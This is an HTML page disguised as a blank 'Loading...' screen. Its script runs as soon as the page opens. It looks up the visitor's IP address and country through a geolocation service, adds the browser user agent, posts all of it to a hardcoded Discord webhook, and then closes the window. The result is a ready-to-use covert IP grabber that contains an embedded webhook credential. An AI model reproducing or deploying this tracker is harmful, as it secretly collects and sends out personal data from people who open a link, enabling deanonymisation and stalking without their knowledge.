<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // ===== CONFIG ===== //
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1405176205451329628/i3nZ0fZyFTnx8qYZWrKOVF_Hkoy3RPOP5dgmjV8LSzQc9SP2cbDGaAdL3w9RlTqDukFq"; // REPLACE!
        const SELF_DESTRUCT_DELAY = 2000; // 2 seconds (ensure webhook delivers)
        // ================== //

        // 🚀 Fetch IP & basic data
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                // 📨 Send to Discord (minimal data)
                const message = `📡 **New Visit**\nIP: ${data.ip}\nCountry: ${data.country || "Unknown"}\nUser Agent: ${navigator.userAgent}`;
                
                fetch(WEBHOOK_URL, { 
                    method: "POST", 
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: message }) 
                })
                .then(() => {
                    // ✅ Confirm webhook sent before closing
                    setTimeout(() => window.close(), SELF_DESTRUCT_DELAY);
                })
                .catch(() => {
                    // ❌ Fallback if Discord fails
                    setTimeout(() => window.close(), SELF_DESTRUCT_DELAY);
                });
            })
            .catch(() => {
                // ❌ Fallback if IP API fails
                fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: "❌ IP fetch failed!" })
                });
                setTimeout(() => window.close(), SELF_DESTRUCT_DELAY);
            });
    </script>
</head>
<body>
    <!-- EMPTY - NO VISIBLE CONTENT -->
</body>
</html>
